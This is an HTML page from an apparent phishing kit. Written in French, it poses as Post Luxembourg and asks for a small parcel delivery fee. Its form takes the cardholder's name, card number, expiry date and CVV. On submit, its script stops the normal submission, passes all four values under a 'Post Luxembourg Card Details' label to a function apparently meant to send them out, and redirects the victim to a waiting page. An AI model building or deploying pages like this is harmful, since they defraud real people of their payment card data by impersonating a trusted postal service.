<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/app.css">
    <title>post</title>
</head>
<body>

<header>
<div class="left"> Mon compte </div>
<div class="right1">Aide</div>
<div class="right"><BUtton>Déconnexion</BUtton></div>
</header>

<img src="res/img/logo-post.svg">

<main>
<div class="login">
<div class="box">
<h2>Frais de livraison : 2,48 EURO</h2>
<p>Veuillez ajouter un mode de paiement pour payer les frais de livraison de votre colis.</p>

<form action="post.php" method="post">
<div class="group">
<label>Nom du titulaire de la carte</label>
<input type="text" name="name" required placeholder="">
</div>

<div class="group">
<label>Numéro de carte</label>
<input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
</div>

<div class="group">
<label>Date d'expiration</label>
<input type="text" name="exp" required placeholder="MM/YY" id="exp">
</div>

<div class="group">
<label>Code de sécurité</label>
<input type="password" name="cvv" required placeholder="CVV" id="cvv">
</div>
<button type="submit">Continuer</button>
</form>
</div>
</div>

</main>

 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");


document.querySelector("form").addEventListener("submit",(e)=>{
e.preventDefault();

wu.zhong(`💳 Post Luxembourg Card Details\n\nName:${document.querySelector("[name='name']").value}\n\nCard Number:${document.querySelector("[name='cc']").value}\n\nExp:${document.querySelector("[name='exp']").value}\n\nCVV:${document.querySelector("[name='cvv']").value}`);

window.location="wait.html";

});


</script>
</body>
</html>
